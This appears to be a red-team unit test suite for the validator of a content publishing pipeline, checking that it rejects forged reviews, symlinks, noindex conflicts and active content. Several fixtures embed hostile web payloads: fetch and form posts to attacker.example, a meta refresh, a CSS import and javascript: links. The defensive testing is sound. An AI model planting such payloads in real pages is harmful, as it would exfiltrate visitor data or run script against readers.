#!/usr/bin/env python3
"""Red-team regressions for final validate_run fail-closed gaps.

This file intentionally exercises invariants that the validator must reject.
It is separate from the structural smoke suite so each exploit remains visible
while the runtime is hardened.
"""

from __future__ import annotations

import hashlib
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from typing import Any


EVALS_ROOT = Path(__file__).resolve().parent
if str(EVALS_ROOT) not in sys.path:
    sys.path.insert(0, str(EVALS_ROOT))

from run_structural_evals import (  # noqa: E402
    CAPABILITY_PREFLIGHT,
    NOW,
    bound_review,
    build_content_ready,
    build_measured,
    build_publish_package,
    refresh_content_reviews,
    rehash_publish,
    validate,
    write_json,
    write_text,
)


def top_level_codes(report: dict[str, Any], severities: set[str] | None = None) -> set[str]:
    findings = report.get("findings", [])
    if severities is not None:
        findings = [item for item in findings if item.get("severity") in severities]
    return {item["code"] for item in findings if isinstance(item, dict) and isinstance(item.get("code"), str)}


def empty_media_manifest(run_id: str) -> dict[str, Any]:
    return {
        "schema_version": "0.1",
        "run_id": run_id,
        "commercial_use": False,
        "policy": {
            "visuals_optional": True,
            "discover_mode": False,
            "performance_budgets": {
                "hero_max_bytes": 300000,
                "inline_max_bytes": 200000,
                "video_max_bytes": 5000000,
            },
        },
        "datasets": [],
        "assets": [],
    }


def evidence_backed_technical_checks(*, include_correspondence: bool = False) -> list[dict[str, str]]:
    checks = [
        {"check": "single_h1", "status": "passed", "evidence": "One H1 observed in the package artifact."},
        {"check": "metadata", "status": "passed", "evidence": "Required metadata fields were inspected."},
        {"check": "schema", "status": "passed", "evidence": "The Article schema decision was inspected."},
        {"check": "links", "status": "passed", "evidence": "Local references were resolved inside the package."},
        {"check": "assets", "status": "not-applicable", "evidence": "This fixture declares no media assets."},
    ]
    if include_correspondence:
        checks.append(
            {
                "check": "reviewed_content_correspondence",
                "status": "passed",
                "evidence": "The package author self-asserted that correspondence passed.",
            }
        )
    return checks


def replace_packaged_article(root: Path, suffix: str, content: str, *, correspondence: bool = True) -> None:
    old_article = root / "publish/article.md"
    new_article = root / f"publish/article{suffix}"
    old_article.unlink()
    write_text(new_article, content)

    manifest = json.loads((root / "manifest.json").read_text(encoding="utf-8"))
    manifest["destination"]["format"] = {".mdx": "mdx", ".html": "html"}[suffix]
    write_json(root / "manifest.json", manifest)

    publish_manifest = json.loads((root / "publish/publish-manifest.json").read_text(encoding="utf-8"))
    publish_manifest["destination"] = manifest["destination"]
    for record in publish_manifest["files"]:
        if record["path"] == "publish/article.md":
            record["path"] = new_article.relative_to(root).as_posix()
        record["sha256"] = hashlib.sha256((root / record["path"]).read_bytes()).hexdigest()
    write_json(root / "publish/publish-manifest.json", publish_manifest)

    write_json(
        root / "reviews/technical.json",
        bound_review(
            root,
            "technical",
            "technical-pass",
            include_package=True,
            scope=f"Portable {suffix[1:].upper()} package",
            checks=evidence_backed_technical_checks(include_correspondence=correspondence),
        ),
    )


class FinalValidateRunRedTeamTests(unittest.TestCase):
    def assert_hard_finding(self, return_code: int, report: dict[str, Any], expected_code: str) -> None:
        self.assertEqual(return_code, 1, report)
        self.assertIn(expected_code, top_level_codes(report, {"P0", "P1"}), report)

    def run_fixture(self, builder) -> tuple[int, dict[str, Any]]:
        with tempfile.TemporaryDirectory(prefix="best-seo-final-redteam-") as temporary:
            root = Path(temporary)
            builder(root)
            return validate(root)

    def test_ymyl_yes_string_cannot_bypass_classification(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_content_ready(root)
            manifest["risk"]["ymyl"] = "yes"
            write_json(root / "manifest.json", manifest)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "YMYL_CLASSIFICATION_INVALID")

    def test_typed_but_fake_approved_ymyl_review_is_rejected(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_content_ready(root)
            manifest["risk"] = {"ymyl": True, "jurisdiction": "US"}
            manifest["roles"]["expert_reviewer"] = "x"
            write_json(root / "manifest.json", manifest)
            write_json(
                root / "reviews/ymyl.json",
                {
                    "review_required": True,
                    "status": "approved",
                    "reviewer": "x",
                    "credentials": "x",
                    "scope": "x",
                    "jurisdiction": "US",
                    "reviewed_at": NOW,
                    "sections_reviewed": ["x"],
                    "findings": [],
                },
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "YMYL_REVIEW_QUALIFICATION_EVIDENCE_MISSING")

    def test_invisible_only_ymyl_qualification_is_rejected(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_content_ready(root)
            invisible = "\u200b"
            reviewer = invisible * 3
            jurisdiction = invisible * 2
            manifest["risk"] = {"ymyl": True, "jurisdiction": jurisdiction}
            manifest["roles"]["expert_reviewer"] = reviewer
            write_json(root / "manifest.json", manifest)
            write_json(
                root / "reviews/ymyl.json",
                {
                    "review_required": True,
                    "status": "approved",
                    "reviewer": reviewer,
                    "credentials": invisible * 8,
                    "scope": invisible * 12,
                    "jurisdiction": jurisdiction,
                    "reviewed_at": NOW,
                    "sections_reviewed": [invisible * 3],
                    "findings": [],
                },
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "YMYL_REVIEW_QUALIFICATION_EVIDENCE_MISSING")

    def test_visible_character_with_invisible_padding_cannot_fake_ymyl_qualification(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_content_ready(root)
            manifest["risk"] = {"ymyl": True, "jurisdiction": "US"}
            manifest["roles"]["expert_reviewer"] = "Dr Reviewer"
            write_json(root / "manifest.json", manifest)
            padding = "\u200b" * 32
            write_json(
                root / "reviews/ymyl.json",
                {
                    "review_required": True,
                    "status": "approved",
                    "reviewer": "Dr Reviewer",
                    "credentials": "x" + padding,
                    "scope": "x" + padding,
                    "jurisdiction": "US",
                    "reviewed_at": NOW,
                    "sections_reviewed": ["x" + padding],
                    "findings": [],
                },
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "YMYL_REVIEW_QUALIFICATION_EVIDENCE_MISSING")

    def test_punctuation_only_ymyl_qualification_is_rejected(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_content_ready(root)
            manifest["risk"] = {"ymyl": True, "jurisdiction": "US"}
            manifest["roles"]["expert_reviewer"] = "!!!"
            write_json(root / "manifest.json", manifest)
            write_json(
                root / "reviews/ymyl.json",
                {
                    "review_required": True,
                    "status": "approved",
                    "reviewer": "!!!",
                    "credentials": "!!!!!!!!",
                    "scope": "............",
                    "jurisdiction": "US",
                    "reviewed_at": NOW,
                    "sections_reviewed": ["***"],
                    "findings": [],
                },
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "YMYL_REVIEW_QUALIFICATION_EVIDENCE_MISSING")

    def test_intake_must_be_an_object(self) -> None:
        def builder(root: Path) -> None:
            build_content_ready(root)
            write_json(root / "intake.json", [])

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "INTAKE_TYPE_INVALID")

    def test_intake_identity_must_match_manifest(self) -> None:
        def builder(root: Path) -> None:
            build_content_ready(root)
            intake = json.loads((root / "intake.json").read_text(encoding="utf-8"))
            intake["target"] = "A different request"
            intake["mode"] = "rewrite"
            write_json(root / "intake.json", intake)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "INTAKE_IDENTITY_MISMATCH")

    def test_actual_status_cannot_exceed_requested_scope(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_content_ready(root)
            manifest["requested_status"] = "draft-only"
            write_json(root / "manifest.json", manifest)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "STATUS_EXCEEDS_REQUESTED_SCOPE")

    def test_paid_capability_approval_must_match_manifest_permission(self) -> None:
        def builder(root: Path) -> None:
            build_content_ready(root)
            preflight = subprocess.run(
                [
                    sys.executable,
                    str(CAPABILITY_PREFLIGHT),
                    "--checked-at",
                    NOW,
                    "--available",
                    "keywords=paid-keyword-provider",
                    "--provider",
                    "keywords=paid-keyword-provider",
                    "--cost",
                    "keywords=paid",
                    "--approve-cost",
                    "keywords",
                ],
                check=True,
                capture_output=True,
                text=True,
            )
            write_json(root / "capabilities.json", json.loads(preflight.stdout))

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "CAPABILITY_PAID_PERMISSION_MISMATCH")

    def test_empty_role_assignments_are_rejected(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_content_ready(root)
            manifest["roles"] = {}
            write_json(root / "manifest.json", manifest)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "ROLE_ASSIGNMENTS_INVALID")

    def test_same_writer_and_verifier_cannot_claim_full_independence(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_content_ready(root)
            manifest["roles"]["verifier"] = manifest["roles"]["writer"]
            write_json(root / "manifest.json", manifest)
            verification = json.loads((root / "reviews/verification.json").read_text(encoding="utf-8"))
            verification["reviewer"] = manifest["roles"]["writer"]
            verification["independence_degraded"] = False
            write_json(root / "reviews/verification.json", verification)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "VERIFICATION_INDEPENDENCE_CONFLICT")

    def test_manifest_run_id_must_match_schema_constraints(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_content_ready(root)
            manifest["run_id"] = "tiny"
            write_json(root / "manifest.json", manifest)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "MANIFEST_RUN_ID_INVALID")

    def test_manifest_target_must_match_schema_constraints(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_content_ready(root)
            manifest["target"] = ""
            write_json(root / "manifest.json", manifest)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "MANIFEST_TARGET_INVALID")

    def test_manifest_language_must_match_schema_constraints(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_content_ready(root)
            manifest["language"] = "e"
            write_json(root / "manifest.json", manifest)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "MANIFEST_LANGUAGE_INVALID")

    def test_mdx_esm_import_is_active_content(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            replace_packaged_article(
                root,
                ".mdx",
                'import Dangerous from "./Dangerous"\n\n# How evidence-led content works\n\n<Dangerous />\n',
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "PUBLISH_ACTIVE_CONTENT")

    def test_mdx_esm_without_keyword_whitespace_is_active_content(self) -> None:
        declarations = (
            'import"./local-module.js"',
            'import/* reviewed fixture */"./local-module.js"',
            'export*from"./local-module.js"',
        )
        for declaration in declarations:
            with self.subTest(declaration=declaration):
                def builder(root: Path, declaration: str = declaration) -> None:
                    build_publish_package(root)
                    article = (root / "publish/article.md").read_text(encoding="utf-8")
                    replace_packaged_article(root, ".mdx", f"{declaration}\n\n{article}")

                code, report = self.run_fixture(builder)
                self.assert_hard_finding(code, report, "PUBLISH_ACTIVE_CONTENT")

    def test_mdx_expression_is_active_content(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            replace_packaged_article(
                root,
                ".mdx",
                "# How evidence-led content works\n\n{globalThis.fetch('https://attacker.example/collect')}\n",
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "PUBLISH_ACTIVE_CONTENT")

    def test_html_meta_refresh_is_active_content(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            replace_packaged_article(
                root,
                ".html",
                '<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://attacker.example/"></head>'
                '<body><h1>How evidence-led content works</h1><p>Evidence.</p></body></html>',
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "PUBLISH_ACTIVE_CONTENT")

    def test_html_form_is_active_content(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            replace_packaged_article(
                root,
                ".html",
                '<html><body><h1>How evidence-led content works</h1>'
                '<form action="https://attacker.example/collect" method="post"><input name="secret"></form>'
                "</body></html>",
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "PUBLISH_ACTIVE_CONTENT")

    def test_html_style_is_active_content(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            replace_packaged_article(
                root,
                ".html",
                '<html><head><style>@import url("https://attacker.example/style.css");</style></head>'
                "<body><h1>How evidence-led content works</h1><p>Evidence.</p></body></html>",
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "PUBLISH_ACTIVE_CONTENT")

    def test_empty_media_manifest_does_not_authorize_undeclared_article_media(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_publish_package(root)
            article = (root / "publish/article.md").read_text(encoding="utf-8")
            article += "\n![Undeclared hero](assets/hero.png)\n"
            write_text(root / "publish/article.md", article)
            write_text(root / "drafts/final.md", article)
            write_text(root / "publish/assets/hero.png", "not-a-real-png")
            write_json(root / "media-manifest.json", empty_media_manifest(manifest["run_id"]))

            publish_manifest = json.loads((root / "publish/publish-manifest.json").read_text(encoding="utf-8"))
            for relative in ("publish/assets/hero.png", "media-manifest.json"):
                publish_manifest["files"].append({"path": relative, "sha256": ""})
            for record in publish_manifest["files"]:
                record["sha256"] = hashlib.sha256((root / record["path"]).read_bytes()).hexdigest()
            write_json(root / "publish/publish-manifest.json", publish_manifest)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "MEDIA_REFERENCE_UNDECLARED")

    def test_publish_article_symlink_is_rejected(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            article_path = root / "publish/article.md"
            content = article_path.read_text(encoding="utf-8")
            write_text(root / "article-target.md", content)
            article_path.unlink()
            article_path.symlink_to("../article-target.md")

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "PUBLISH_ARTICLE_SYMLINK")

    def test_claim_ledger_symlink_is_rejected(self) -> None:
        def builder(root: Path) -> None:
            build_content_ready(root)
            claims_path = root / "claims.jsonl"
            claims_path.rename(root / "claims-target.jsonl")
            claims_path.symlink_to("claims-target.jsonl")

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "ARTIFACT_SYMLINK")

    def test_standalone_dataset_manifest_is_validated_without_media_manifest(self) -> None:
        def builder(root: Path) -> None:
            build_content_ready(root)
            write_json(root / "dataset-manifest.json", [])

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "DATASET_VALIDATOR_FAILED")

    def test_literal_space_in_http_url_is_rejected(self) -> None:
        def builder(root: Path) -> None:
            build_content_ready(root)
            serp = json.loads((root / "research/serp.json").read_text(encoding="utf-8"))
            serp["results"] = [{"url": "https://example.test/path with space", "opened": True}]
            write_json(root / "research/serp.json", serp)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "SERP_RESULT_URL_INVALID")

    def test_markdown_link_with_literal_space_is_not_skipped(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            article = (root / "publish/article.md").read_text(encoding="utf-8")
            article += "\n[Malformed destination](https://example.test/path with space)\n"
            write_text(root / "publish/article.md", article)
            write_text(root / "drafts/final.md", article)
            refresh_content_reviews(root)
            rehash_publish(root)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "LINK_URL_INVALID")

    def test_markdown_media_with_literal_space_is_not_skipped(self) -> None:
        def builder(root: Path) -> None:
            build_content_ready(root)
            article = (root / "drafts/final.md").read_text(encoding="utf-8")
            write_text(root / "drafts/final.md", article + "\n![Unsafe](assets/un tracked.png)\n")

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "MEDIA_REFERENCE_INVALID")

    def test_reference_style_markdown_image_must_be_declared(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_publish_package(root)
            article = (root / "publish/article.md").read_text(encoding="utf-8")
            article += '\n![Undeclared chart][chart-ref]\n\n[chart-ref]: assets/chart.png "Chart"\n'
            write_text(root / "publish/article.md", article)
            write_text(root / "drafts/final.md", article)
            write_json(root / "media-manifest.json", empty_media_manifest(manifest["run_id"]))

            publish_manifest = json.loads((root / "publish/publish-manifest.json").read_text(encoding="utf-8"))
            publish_manifest["files"].append(
                {
                    "path": "media-manifest.json",
                    "sha256": hashlib.sha256((root / "media-manifest.json").read_bytes()).hexdigest(),
                }
            )
            write_json(root / "publish/publish-manifest.json", publish_manifest)
            rehash_publish(root)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "MEDIA_REFERENCE_UNDECLARED")

    def test_nested_reference_image_syntax_fails_closed(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            article = (root / "publish/article.md").read_text(encoding="utf-8")
            article += "\n![Undeclared [nested alt]][chart-ref]\n\n[chart-ref]: assets/chart.png\n"
            write_text(root / "publish/article.md", article)
            write_text(root / "drafts/final.md", article)
            rehash_publish(root)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "MEDIA_REFERENCE_UNPARSED")

    def test_unsafe_reference_definition_is_rejected_even_when_nested(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            article = (root / "publish/article.md").read_text(encoding="utf-8")
            article += "\n[Safe-looking [nested label]][attack]\n\n[attack]: javascript:alert(document.domain)\n"
            write_text(root / "publish/article.md", article)
            write_text(root / "drafts/final.md", article)
            rehash_publish(root)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "UNSAFE_LINK_SCHEME")

    def test_nested_inline_link_text_cannot_hide_unsafe_scheme(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            article = (root / "publish/article.md").read_text(encoding="utf-8")
            article += "\n[Safe-looking [nested label]](javascript:alert(document.domain))\n"
            write_text(root / "publish/article.md", article)
            write_text(root / "drafts/final.md", article)
            rehash_publish(root)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "UNSAFE_LINK_SCHEME")

    def test_commonmark_javascript_autolink_is_rejected(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            article = (root / "publish/article.md").read_text(encoding="utf-8")
            article += "\n<javascript:alert(document.domain)>\n"
            write_text(root / "publish/article.md", article)
            write_text(root / "drafts/final.md", article)
            rehash_publish(root)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "UNSAFE_LINK_SCHEME")

    def test_autolinks_and_image_syntax_inside_code_fences_are_inert(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            article = (root / "publish/article.md").read_text(encoding="utf-8")
            article += "\n````markdown\n<javascript:alert(document.domain)>\n![Example][asset]\n[asset]: https://attacker.test/a.svg\n````\n"
            write_text(root / "publish/article.md", article)
            write_text(root / "drafts/final.md", article)
            refresh_content_reviews(root)
            rehash_publish(root)

        code, report = self.run_fixture(builder)
        self.assertEqual(code, 0, report)
        self.assertNotIn("UNSAFE_LINK_SCHEME", top_level_codes(report), report)
        self.assertNotIn("MEDIA_MANIFEST_REQUIRED", top_level_codes(report), report)

    def test_html_robots_noindex_nofollow_conflicts_with_ready_package(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            replace_packaged_article(
                root,
                ".html",
                '<!doctype html><html><head><meta name="robots" content="noindex,nofollow"></head><body>'
                "<h1>How evidence-led content works</h1><h2>Evidence</h2>"
                "<p>Search documentation recommends evidence-led, useful content.</p></body></html>",
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "PUBLISH_INDEXABILITY_CONFLICT")

    def test_markdown_frontmatter_noindex_conflicts_with_ready_package(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            article = (root / "publish/article.md").read_text(encoding="utf-8")
            article = "---\nrobots: noindex, nofollow\n---\n\n" + article
            write_text(root / "publish/article.md", article)
            write_text(root / "drafts/final.md", article)
            rehash_publish(root)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "PUBLISH_INDEXABILITY_CONFLICT")

    def test_markdown_frontmatter_boolean_and_nested_noindex_forms_are_rejected(self) -> None:
        frontmatters = (
            "noindex: true",
            "index: false",
            "robots: {index: false}",
            "seo:\n  robots:\n    noindex: true",
        )
        for frontmatter in frontmatters:
            with self.subTest(frontmatter=frontmatter):
                def builder(root: Path, frontmatter: str = frontmatter) -> None:
                    build_publish_package(root)
                    article = (root / "publish/article.md").read_text(encoding="utf-8")
                    article = f"---\n{frontmatter}\n---\n\n{article}"
                    write_text(root / "publish/article.md", article)
                    write_text(root / "drafts/final.md", article)
                    rehash_publish(root)

                code, report = self.run_fixture(builder)
                self.assert_hard_finding(code, report, "PUBLISH_INDEXABILITY_CONFLICT")

    def test_embedded_html_h1_cannot_hide_behind_one_markdown_h1(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            article = (root / "publish/article.md").read_text(encoding="utf-8")
            article += "\n<h1>Second rendered H1</h1>\n"
            write_text(root / "publish/article.md", article)
            write_text(root / "drafts/final.md", article)
            rehash_publish(root)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "PUBLISH_H1_COUNT")

    def test_publish_metadata_noindex_conflicts_with_ready_package(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            metadata_path = root / "publish/metadata.json"
            metadata = json.loads(metadata_path.read_text(encoding="utf-8"))
            metadata["robots"] = {"index": False, "follow": False}
            write_json(metadata_path, metadata)
            rehash_publish(root)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "PUBLISH_INDEXABILITY_CONFLICT")

    def test_duplicate_html_robot_attributes_cannot_hide_noindex(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            replace_packaged_article(
                root,
                ".html",
                '<!doctype html><html><head><meta name="robots" content="noindex" content="index"></head><body>'
                "<h1>How evidence-led content works</h1><h2>Evidence</h2>"
                "<p>Search documentation recommends evidence-led, useful content.</p></body></html>",
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "PUBLISH_INDEXABILITY_CONFLICT")

    def test_impossible_publication_measurement_timeline_is_rejected(self) -> None:
        def builder(root: Path) -> None:
            build_measured(root)
            receipt = json.loads((root / "publish/publish-receipt.json").read_text(encoding="utf-8"))
            receipt["published_at"] = "2026-08-20T09:00:00Z"
            write_json(root / "publish/publish-receipt.json", receipt)

            live = json.loads((root / "reviews/live-verification.json").read_text(encoding="utf-8"))
            live["checked_at"] = "2026-08-19T09:00:00Z"
            write_json(root / "reviews/live-verification.json", live)

            baseline = json.loads((root / "measurement/baseline.json").read_text(encoding="utf-8"))
            baseline["measured_at"] = "2026-08-21T09:00:00Z"
            write_json(root / "measurement/baseline.json", baseline)

            snapshot_path = root / "measurement/snapshots/2026-08-29.json"
            snapshot = json.loads(snapshot_path.read_text(encoding="utf-8"))
            snapshot["measured_at"] = "2026-08-22T09:00:00Z"
            write_json(snapshot_path, snapshot)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "EVENT_TIMELINE_INVALID")

    def test_live_verification_requires_per_check_observation_evidence(self) -> None:
        def builder(root: Path) -> None:
            build_measured(root)
            live_path = root / "reviews/live-verification.json"
            live = json.loads(live_path.read_text(encoding="utf-8"))
            live["checks"]["http"] = "passed"
            write_json(live_path, live)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "LIVE_VERIFICATION_CHECK_FAILED")

    def test_punctuation_only_live_evidence_and_publish_actor_are_rejected(self) -> None:
        def builder(root: Path) -> None:
            build_measured(root)
            live_path = root / "reviews/live-verification.json"
            live = json.loads(live_path.read_text(encoding="utf-8"))
            for check in live["checks"].values():
                check["evidence"] = "............"
            write_json(live_path, live)
            receipt_path = root / "publish/publish-receipt.json"
            receipt = json.loads(receipt_path.read_text(encoding="utf-8"))
            receipt["actor"] = "!"
            write_json(receipt_path, receipt)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "LIVE_VERIFICATION_CHECK_FAILED")
        self.assertIn("PUBLISH_RECEIPT_ACTOR_MISSING", top_level_codes(report, {"P0", "P1"}), report)

    def test_unicode_format_controls_are_rejected_in_urls_and_manifest_fields(self) -> None:
        def builder(root: Path) -> None:
            manifest = build_content_ready(root)
            manifest["target"] = "Evidence workflow\u202ereversed"
            write_json(root / "manifest.json", manifest)
            serp = json.loads((root / "research/serp.json").read_text(encoding="utf-8"))
            serp["results"] = [{"url": "https://example.test/safe\u2066hidden", "opened": True}]
            write_json(root / "research/serp.json", serp)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "UNICODE_CONTROL_CHARACTER_INVALID")

    def test_dict_technical_checks_require_per_check_evidence(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            technical = json.loads((root / "reviews/technical.json").read_text(encoding="utf-8"))
            technical["checks"] = {
                "single_h1": True,
                "metadata": "passed",
                "schema": "passed",
                "links": "passed",
                "assets": "not-applicable",
            }
            write_json(root / "reviews/technical.json", technical)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "TECHNICAL_CHECK_EVIDENCE_MISSING")

    def test_punctuation_only_technical_evidence_is_rejected(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            technical_path = root / "reviews/technical.json"
            technical = json.loads(technical_path.read_text(encoding="utf-8"))
            for check in technical["checks"].values():
                check["evidence"] = "............"
            write_json(technical_path, technical)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "TECHNICAL_CHECK_EVIDENCE_MISSING")

    def test_required_technical_observations_cannot_be_not_applicable(self) -> None:
        for check_name in ("single_h1", "metadata", "links"):
            with self.subTest(check=check_name):
                def builder(root: Path, check_name: str = check_name) -> None:
                    build_publish_package(root)
                    technical_path = root / "reviews/technical.json"
                    technical = json.loads(technical_path.read_text(encoding="utf-8"))
                    technical["checks"][check_name] = {
                        "status": "not-applicable",
                        "evidence": "The reviewer claimed this mandatory observation did not apply.",
                    }
                    write_json(technical_path, technical)

                code, report = self.run_fixture(builder)
                self.assert_hard_finding(code, report, "TECHNICAL_CORE_CHECKS_MISSING")

    def test_measurement_sources_require_available_capability_or_export(self) -> None:
        def builder(root: Path) -> None:
            build_measured(root)
            baseline_path = root / "measurement/baseline.json"
            baseline = json.loads(baseline_path.read_text(encoding="utf-8"))
            baseline["source_evidence"][0]["source_system"] = "ga4"
            baseline["source_evidence"][0]["provider"] = "google-analytics-export"
            for metric in baseline["metrics"].values():
                metric["source_system"] = "ga4"
            write_json(baseline_path, baseline)
            snapshot_path = root / "measurement/snapshots/2026-08-29.json"
            snapshot = json.loads(snapshot_path.read_text(encoding="utf-8"))
            snapshot["source_evidence"][0]["source_system"] = "ga4"
            snapshot["source_evidence"][0]["provider"] = "google-analytics-export"
            for metric in snapshot["metrics"].values():
                metric["source_system"] = "ga4"
            write_json(snapshot_path, snapshot)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "MEASUREMENT_BASELINE_SOURCE_UNAVAILABLE")

    def test_measurement_metrics_must_be_numeric_and_comparable(self) -> None:
        def builder(root: Path) -> None:
            build_measured(root)
            snapshot_path = root / "measurement/snapshots/2026-08-29.json"
            snapshot = json.loads(snapshot_path.read_text(encoding="utf-8"))
            snapshot["metrics"]["clicks"]["value"] = "eighteen"
            write_json(snapshot_path, snapshot)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "MEASUREMENT_SNAPSHOT_METRIC_VALUE_INVALID")

    def test_measurement_requires_numeric_baseline_metrics(self) -> None:
        def builder(root: Path) -> None:
            build_measured(root)
            baseline_path = root / "measurement/baseline.json"
            baseline = json.loads(baseline_path.read_text(encoding="utf-8"))
            baseline.pop("metrics")
            write_json(baseline_path, baseline)

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "MEASUREMENT_BASELINE_METRICS_INVALID")

    def test_transformed_mdx_cannot_self_assert_correspondence(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            replace_packaged_article(
                root,
                ".mdx",
                "# How evidence-led content works\n\nThis package body is unrelated to the independently reviewed draft.\n",
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "RENDERED_CONTENT_CORRESPONDENCE_UNVERIFIED")

    def test_transformed_html_cannot_self_assert_correspondence(self) -> None:
        def builder(root: Path) -> None:
            build_publish_package(root)
            replace_packaged_article(
                root,
                ".html",
                "<html><body><h1>How evidence-led content works</h1>"
                "<p>This package body is unrelated to the independently reviewed draft.</p></body></html>",
            )

        code, report = self.run_fixture(builder)
        self.assert_hard_finding(code, report, "RENDERED_CONTENT_CORRESPONDENCE_UNVERIFIED")


if __name__ == "__main__":
    unittest.main(verbosity=2)
